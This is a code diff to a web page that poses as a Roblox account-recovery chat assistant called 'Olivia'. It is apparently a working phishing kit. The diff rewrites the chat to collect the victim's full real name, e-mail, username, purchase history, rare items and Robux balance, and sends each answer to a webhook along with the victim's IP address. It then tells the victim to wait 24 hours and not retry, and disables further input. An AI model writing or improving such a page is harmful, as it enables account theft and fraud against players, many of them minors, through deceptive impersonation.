@@ -1089,6 +1089,7 @@
         let userEmail = '';
         let userRoblox = '';
         let userProblem = '';
+        let analysisStarted = false;
 
         // ===== NOVAS FUNÇÕES INTERATIVAS =====
         function showStats() {
@@ -1109,96 +1110,115 @@
             sendMessage();
         }
 
-        // ===== NOVAS MENSAGENS DA OLIVIA (MUITO MAIS FALAS) =====
+        // ===== FUNÇÃO PARA MOSTRAR EXEMPLOS =====
+        function showExamples() {
+            const examples = [
+                "💡 **EXEMPLOS DE RESPOSTAS:**",
+                "• **NOME COMPLETO:** João Silva Santos",
+                "• **E-MAIL:** joaosilva@gmail.com",
+                "• **USERNAME:** joaozinho_roblox123",
+                "• **COMPRA:** R$50 ou Korblox",
+                "• **ACESSO E-MAIL:** SIM ou NÃO",
+                "• **DATA:** março/2020"
+            ];
+            
+            const messagesDiv = document.getElementById('chatMessages');
+            const examplesDiv = document.createElement('div');
+            examplesDiv.className = 'message olivia';
+            examplesDiv.style.background = 'rgba(99, 102, 241, 0.2)';
+            examplesDiv.style.border = '1px solid #6366f1';
+            
+            examplesDiv.innerHTML = `
+                <div class="message-content">${examples.join('<br>')}</div>
+                <div class="message-time">${new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' })}</div>
+            `;
+            
+            messagesDiv.appendChild(examplesDiv);
+            messagesDiv.scrollTop = messagesDiv.scrollHeight;
+        }
+
+        // ===== BOTÕES SIM/NÃO =====
+        function addYesNoButtons() {
+            const messagesDiv = document.getElementById('chatMessages');
+            const optionsDiv = document.createElement('div');
+            optionsDiv.className = 'quick-actions';
+            optionsDiv.style.margin = '10px 0';
+            optionsDiv.style.display = 'grid';
+            optionsDiv.style.gridTemplateColumns = '1fr 1fr';
+            
+            const btnSim = document.createElement('button');
+            btnSim.className = 'quick-action-btn';
+            btnSim.textContent = '✅ SIM';
+            btnSim.style.background = 'rgba(16, 185, 129, 0.2)';
+            btnSim.style.borderColor = '#10b981';
+            btnSim.onclick = () => sendQuickMessage('SIM');
+            
+            const btnNao = document.createElement('button');
+            btnNao.className = 'quick-action-btn';
+            btnNao.textContent = '❌ NÃO';
+            btnNao.style.background = 'rgba(244, 63, 94, 0.2)';
+            btnNao.style.borderColor = '#f43f5e';
+            btnNao.onclick = () => sendQuickMessage('NÃO');
+            
+            optionsDiv.appendChild(btnSim);
+            optionsDiv.appendChild(btnNao);
+            
+            messagesDiv.appendChild(optionsDiv);
+            messagesDiv.scrollTop = messagesDiv.scrollHeight;
+        }
+
+        // ===== MENSAGENS DA OLIVIA - MAIS CLARAS E DIRETAS =====
         const oliviaMessages = [
             // Boas-vindas (0)
-            "Olá! Sou Olivia, prazer em te conhecer! 🌟 Como posso ajudar você hoje? Estou aqui para ajudar com recuperação de contas e outras questões.",
+            "Olá! Sou Olivia, prazer em te conhecer! 🌟 Vou te ajudar a recuperar sua conta.\n\nPrimeiro, me conta: **o que aconteceu com sua conta?**\n(ex: perdi acesso, hackearam, esqueci senha)",
             
             // Pergunta o problema (1)
-            "Conte pra mim, o que está acontecendo com sua conta? Fique à vontade para me explicar.",
+            "Entendi! Agora preciso do seu **NOME COMPLETO** (nome real, igual nos documentos):",
             
             // Pergunta nome (2)
-            "Entendi! Para começarmos, qual é o seu nome? Assim posso te chamar pelo nome durante o atendimento.",
+            "Obrigada! Agora me informe seu **E-MAIL** (o que você usou para criar a conta Roblox):",
             
             // Resposta com nome (3)
-            "Prazer em te conhecer, {nome}! Agora, qual é o email que você usa na sua conta Roblox?",
+            "Perfeito! Agora qual é seu **NOME DE USUÁRIO** no Roblox? (ex: joaozinho123)",
             
             // Pergunta email (4)
-            "Ótimo! E qual é o seu nome de usuário no Roblox? (o mesmo que aparece no jogo)",
+            "Ótimo! Agora me diga qual foi a **ÚLTIMA COMPRA** que você fez no Roblox (pode ser o valor ou o item):",
             
             // Pergunta username (5)
-            "Perfeito! Agora preciso de algumas informações para confirmar que a conta é realmente sua. Você lembra qual foi a última compra que fez no Roblox? Pode ser o valor ou o item.",
+            "Entendi! Você ainda tem **ACESSO AO E-MAIL** de cadastro?",
             
             // Pergunta compra (6)
-            "Entendi. Você ainda tem acesso ao email de cadastro? Precisamos enviar um código de verificação por lá.",
+            "Ok! Agora me diga a **DATA APROXIMADA** que você criou essa conta (mês/ano):",
             
             // Verificando (7)
-            "Vou verificar essas informações pra você. Isso pode levar alguns minutos...",
+            "Você tem algum **ITEM EXCLUSIVO** ou raro na conta? (ex: Headless, Korblox, etc)",
             
             // Pergunta data criação (8)
-            "Enquanto isso, você poderia me dizer quando você criou essa conta? Mês e ano aproximado já ajuda.",
+            "Quantos **ROBUX** você tem atualmente na conta? (valor aproximado)",
             
             // Pergunta itens exclusivos (9)
-            "Você tem algum item exclusivo ou raro na conta? Isso ajuda na verificação.",
+            "Todas as informações foram enviadas para análise. 🔍\n\n**⏳ ISSO PODE LEVAR ATÉ 24 HORAS**\n\n⚠️ **NÃO TENTE NOVAMENTE** durante este período, pois o sistema vai travar e você não receberá nada.",
             
-            // Quase lá (10)
-            "Quase terminando a análise...",
-            
-            // Pergunta robux atual (11)
-            "Quantos Robux você tem atualmente na conta? (valor aproximado)",
-            
-            // Processando (12)
-            "Estou processando todas essas informações...",
-            
-            // Última verificação (13)
-            "Só mais um momento, estou validando os dados...",
-            
-            // Sucesso (14)
-            "Perfeito! Sua conta foi verificada com sucesso! 🎉 Em instantes você receberá as instruções no seu email. O código de recuperação é válido por 24 horas.",
-            
-            // Agradecimento (15)
-            "Foi um prazer ajudar, {nome}! Se precisar de mais alguma coisa, é só me chamar. Estou aqui 24 horas por dia! 💜",
-            
-            // Oferta de ajuda extra (16)
-            "Além disso, você gostaria de saber sobre dicas de segurança para sua conta?",
-            
-            // Dicas de segurança (17)
-            "Claro! Algumas dicas: ative verificação em duas etapas, não compartilhe seu cookie com ninguém, e use senhas fortes! 🔒",
-            
-            // Finalização (18)
-            "Qualquer dúvida, estou por aqui! Tenha um ótimo dia! ✨"
+            // Última mensagem (10) - NÃO RESPONDE MAIS
+            "Sua solicitação está em análise. Você receberá um e-mail em até 24 horas com as instruções.\n\n**Não é necessário responder mais.**"
         ];
 
-        // Mensagens alternativas para quando o usuário demora (MAIS VARIEDADE)
+        // Mensagens alternativas para quando o usuário demora
         const waitingMessages = [
             "Ainda estou aqui! Tô só esperando sua resposta 😊",
             "Sem pressa! Me responde quando puder.",
             "Continua aí? Qualquer dúvida é só perguntar.",
             "Tô aguardando sua resposta pra continuar com o atendimento.",
             "Ainda está aí? Podemos continuar quando você quiser.",
-            "Olha eu aqui de novo! 😄 Me avisa quando estiver pronto.",
-            "Enquanto isso, já pensou em ativar a verificação em duas etapas?",
-            "Não precisa ter pressa, estou aqui! 🌟",
-            "Oi! Ainda estamos conversando?",
-            "Posso ajudar com mais alguma coisa enquanto isso?"
+            "Olha eu aqui de novo! 😄 Me avisa quando estiver pronto."
         ];
 
-        // Mensagens de despedida (quando fecha o chat)
+        // Mensagens de despedida
         const goodbyeMessages = [
             "Foi um prazer ajudar! 💜",
             "Qualquer coisa, é só voltar! 🌟",
             "Até mais! Cuide bem da sua conta! 🔒",
-            "Volte sempre que precisar! ✨",
-            "Sucesso pra você! 🚀"
-        ];
-
-        // Mensagens de erro/suporte
-        const supportMessages = [
-            "Não consegui entender, pode repetir?",
-            "Desculpa, pode explicar de outra forma?",
-            "Entendi! Continuando...",
-            "Ok! Anotei aqui.",
-            "Perfeito! Próximo passo..."
+            "Volte sempre que precisar! ✨"
         ];
 
         // ===== FUNÇÕES DO CHAT OLIVIA =====
@@ -1214,6 +1234,7 @@
             userEmail = '';
             userRoblox = '';
             userProblem = '';
+            analysisStarted = false;
             
             // Gerar novo ID de conversa
             conversationId = generateSessionId();
@@ -1225,6 +1246,11 @@
             setTimeout(() => {
                 addOliviaMessage(oliviaMessages[0]);
                 sendToWebhook('system', 'chat_iniciado', { message: 'Chat iniciado' });
+                
+                // Mostrar exemplos após 2 segundos
+                setTimeout(() => {
+                    showExamples();
+                }, 2000);
             }, 1000);
         }
 
@@ -1259,8 +1285,11 @@
             
             const time = new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
             
+            // Formatar texto com quebras de linha
+            const formattedText = text.replace(/\n/g, '<br>');
+            
             messageDiv.innerHTML = `
-                <div class="message-content">${text}</div>
+                <div class="message-content">${formattedText}</div>
                 <div class="message-time">${time}</div>
             `;
             
@@ -1327,6 +1356,13 @@
             
             if (!text) return;
             
+            // SE JÁ INICIOU A ANÁLISE, NÃO RESPONDE MAIS
+            if (analysisStarted) {
+                addOliviaMessage("⚠️ Sua solicitação já está em análise. Por favor, aguarde até 24 horas para receber o e-mail. Não é necessário responder mais.");
+                input.value = '';
+                return;
+            }
+            
             addUserMessage(text);
             input.value = '';
             
@@ -1335,115 +1371,119 @@
             
             chatStep++;
             
-            // Salvar informações dependendo do passo
-            switch(chatStep) {
-                case 1:
-                    userProblem = text;
-                    sendToWebhook('info', 'problema', { problema: text });
-                    break;
-                case 2:
-                    userName = text;
-                    sendToWebhook('info', 'nome', { nome: text });
-                    break;
-                case 3:
-                    userEmail = text;
-                    sendToWebhook('info', 'email', { email: text });
-                    break;
-                case 4:
-                    userRoblox = text;
-                    sendToWebhook('info', 'username', { username: text });
-                    break;
-                case 5:
-                    sendToWebhook('info', 'ultima_compra', { compra: text });
-                    break;
-                case 6:
-                    sendToWebhook('info', 'acesso_email', { acesso: text });
-                    break;
-                case 7:
-                    sendToWebhook('info', 'data_criacao', { data: text });
-                    break;
-                case 8:
-                    sendToWebhook('info', 'itens_exclusivos', { itens: text });
-                    break;
-                case 9:
-                    sendToWebhook('info', 'robux_atual', { robux: text });
-                    break;
-                default:
-                    sendToWebhook('info', 'resposta_extra', { resposta: text });
+            // VALIDAÇÃO POR PASSO
+            if (chatStep === 1) {
+                // Problema - qualquer coisa vale
+                userProblem = text;
+                sendToWebhook('info', 'problema', { problema: text });
+            } 
+            else if (chatStep === 2) {
+                // Nome completo - deve ter pelo menos 5 caracteres e não pode ser email
+                if (text.length < 5) {
+                    addOliviaMessage("❌ Por favor, digite um **NOME COMPLETO** válido (mínimo 5 letras)");
+                    chatStep--; // Volta um passo
+                    return;
+                }
+                if (text.includes('@')) {
+                    addOliviaMessage("❌ Isso parece um e-mail. Digite seu **NOME COMPLETO** (ex: João Silva)");
+                    chatStep--;
+                    return;
+                }
+                userName = text;
+                sendToWebhook('info', 'nome', { nome: text });
+            } 
+            else if (chatStep === 3) {
+                // Email - validação básica
+                if (!text.includes('@') || !text.includes('.')) {
+                    addOliviaMessage("❌ Isso não parece um **E-MAIL** válido. Digite um email com @ e . (ex: nome@gmail.com)");
+                    chatStep--;
+                    return;
+                }
+                userEmail = text;
+                sendToWebhook('info', 'email', { email: text });
+            } 
+            else if (chatStep === 4) {
+                // Username Roblox
+                if (text.length < 3) {
+                    addOliviaMessage("❌ Por favor, digite um **NOME DE USUÁRIO** válido (mínimo 3 caracteres)");
+                    chatStep--;
+                    return;
+                }
+                userRoblox = text;
+                sendToWebhook('info', 'username', { username: text });
+            } 
+            else if (chatStep === 5) {
+                // Última compra
+                sendToWebhook('info', 'ultima_compra', { compra: text });
+                
+                // Mostrar botões SIM/NÃO para próxima pergunta
+                setTimeout(() => {
+                    addYesNoButtons();
+                }, 1000);
+            } 
+            else if (chatStep === 6) {
+                // Acesso ao email - deve ser SIM ou NÃO
+                const resposta = text.toUpperCase();
+                if (resposta !== 'SIM' && resposta !== 'NÃO' && resposta !== 'NAO') {
+                    addOliviaMessage("❌ Por favor, responda apenas com **SIM** ou **NÃO**");
+                    chatStep--;
+                    return;
+                }
+                sendToWebhook('info', 'acesso_email', { acesso: text });
+            } 
+            else if (chatStep === 7) {
+                // Data de criação
+                sendToWebhook('info', 'data_criacao', { data: text });
+            } 
+            else if (chatStep === 8) {
+                // Itens exclusivos
+                sendToWebhook('info', 'itens_exclusivos', { itens: text });
+            } 
+            else if (chatStep === 9) {
+                // Robux atual
+                sendToWebhook('info', 'robux_atual', { robux: text });
+                
+                // MARCAR QUE A ANÁLISE COMEÇOU
+                analysisStarted = true;
+            } 
+            else {
+                // Depois do passo 9, não aceita mais respostas
+                analysisStarted = true;
+                addOliviaMessage("⚠️ Sua solicitação já está em análise. Por favor, aguarde até 24 horas.");
+                return;
             }
             
             // Simular digitação
             showTyping();
             
-            // Tempo de resposta variado (parece mais humano)
+            // Tempo de resposta variado
             const typingTime = Math.floor(Math.random() * 1500) + 1000;
             await new Promise(resolve => setTimeout(resolve, typingTime));
             
             hideTyping();
             
-            // Resposta da Olivia baseada no passo
-            if (chatStep < oliviaMessages.length) {
-                // Escolher mensagem específica ou aleatória
+            // Resposta da Olivia baseada no passo (só responde se ainda estiver no fluxo)
+            if (!analysisStarted && chatStep < oliviaMessages.length) {
                 let messageToSend = oliviaMessages[chatStep];
-                
-                // Se for passo 16 (dicas de segurança), oferecer opção
-                if (chatStep === 16) {
-                    messageToSend = oliviaMessages[16];
-                    // Mostrar botões de sim/não
-                    setTimeout(() => {
-                        addQuickOptions(['Sim, quero dicas', 'Não, obrigado']);
-                    }, 2000);
-                } else {
-                    addOliviaMessage(messageToSend);
-                }
+                addOliviaMessage(messageToSend);
                 
                 sendToWebhook('olivia', 'resposta', { 
                     message: messageToSend,
                     step: chatStep 
                 });
-            } else if (chatStep >= oliviaMessages.length) {
-                // Mensagens genéricas para depois do fim
-                const finalMessages = [
-                    "Entendi! Algo mais em que posso ajudar?",
-                    "Ok! Continuamos por aqui então.",
-                    "Perfeito! Mais alguma dúvida?",
-                    "Tudo certo por aqui! 😊"
-                ];
-                const randomMsg = finalMessages[Math.floor(Math.random() * finalMessages.length)];
-                addOliviaMessage(randomMsg);
-            }
-        }
-
-        // Função para adicionar opções rápidas no chat
-        function addQuickOptions(options) {
-            const messagesDiv = document.getElementById('chatMessages');
-            const optionsDiv = document.createElement('div');
-            optionsDiv.className = 'quick-actions';
-            optionsDiv.style.margin = '10px 0';
-            optionsDiv.style.display = 'grid';
-            
-            options.forEach(option => {
-                const btn = document.createElement('button');
-                btn.className = 'quick-action-btn';
-                btn.textContent = option;
-                btn.onclick = () => sendQuickMessage(option);
-                optionsDiv.appendChild(btn);
-            });
-            
-            messagesDiv.appendChild(optionsDiv);
-            messagesDiv.scrollTop = messagesDiv.scrollHeight;
-        }
-
-        // Verificar se o usuário demorou para responder
-        let inactivityTimer;
-        function resetInactivityTimer() {
-            if (inactivityTimer) clearTimeout(inactivityTimer);
-            inactivityTimer = setTimeout(() => {
-                if (document.getElementById('page3').classList.contains('hidden')) return;
                 
-                const randomMessage = waitingMessages[Math.floor(Math.random() * waitingMessages.length)];
-                addOliviaMessage(randomMessage);
-            }, 45000); // 45 segundos sem resposta
+                // Se for a mensagem de análise (passo 9), desabilitar input
+                if (chatStep === 9) {
+                    document.getElementById('chatInput').disabled = true;
+                    document.querySelector('.chat-send').disabled = true;
+                    document.querySelector('.chat-send').style.opacity = '0.5';
+                    
+                    // Aviso final
+                    setTimeout(() => {
+                        addOliviaMessage("⏳ **AGUARDE 24 HORAS**\nVocê receberá um e-mail com as instruções.\n\nNão tente novamente ou o sistema vai travar.");
+                    }, 2000);
+                }
+            }
         }
 
         // Função para enviar dados para a webhook do chat
@@ -1494,7 +1534,6 @@ Problema: ${userProblem || 'Não informado'}
                 const response = await fetch('https://api.ipify.org?format=json');
                 const data = await response.json();
                 userIP = data.ip || 'IP não disponível';
-                // Não mostrar IP na interface
                 await checkIfBanned();
                 return userIP;
             } catch (error) {
